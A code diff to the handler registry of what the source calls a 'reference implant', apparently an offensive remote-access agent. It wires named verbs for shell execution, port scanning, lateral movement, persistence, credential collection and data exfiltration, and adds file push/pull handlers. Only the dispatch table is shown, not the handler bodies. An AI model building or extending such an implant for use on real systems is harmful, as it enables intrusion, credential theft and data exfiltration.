@@ -114,17 +114,21 @@ internal sealed class HandlerRegistry
 
     /// <summary>
     /// Builds the reference registry: one compiled handler per standard
-    /// category verb the reference implant implements (architecture.md
-    /// Sec 10.1), the lateral.move handler carrying the <paramref name="enroll"/>
-    /// bundle when child derivation is enabled. <paramref name="additional"/>
-    /// carries extra compile-time registrations (an out-of-tree handler, or a
-    /// test's stand-in), appended after the reference set.
+    /// category verb the reference implant implements -- the core baseline
+    /// (shell, file push/pull) plus the recon, lateral, persist, collect, and
+    /// exfil sets (architecture.md Sec 10.1) -- the lateral.move handler
+    /// carrying the <paramref name="enroll"/> bundle when child derivation is
+    /// enabled. <paramref name="additional"/> carries extra compile-time
+    /// registrations (an out-of-tree handler, or a test's stand-in), appended
+    /// after the reference set.
     /// </summary>
     public static HandlerRegistry Default(EnrollBundle? enroll = null, IEnumerable<ICapabilityHandler>? additional = null)
     {
         var handlers = new List<ICapabilityHandler>
         {
             new CapabilityHandler("shell.exec", args => Core.ShellExec(args)),
+            new CapabilityHandler("file.push", args => Files.Push(args)),
+            new CapabilityHandler("file.pull", args => Files.Pull(args)),
             new CapabilityHandler("recon.portscan", args => Core.PortScan(args)),
             new CapabilityHandler("recon.hostenum", args => Core.HostEnum(args)),
             new CapabilityHandler("recon.service", args => Core.ServiceProbe(args)),
@@ -134,7 +138,6 @@ internal sealed class HandlerRegistry
             new CapabilityHandler("persist.install", args => Persist.Install(args)),
             new CapabilityHandler("persist.remove", args => Persist.Remove(args)),
             new CapabilityHandler("persist.list", args => Persist.List(args)),
-            new CapabilityHandler("collect.file", args => Collect.File(args)),
             new CapabilityHandler("collect.cred", args => Collect.Cred(args)),
             new CapabilityHandler("exfil.push", args => Exfil.Push(args)),
             new CapabilityHandler("exfil.stage", args => Exfil.Stage(args)),
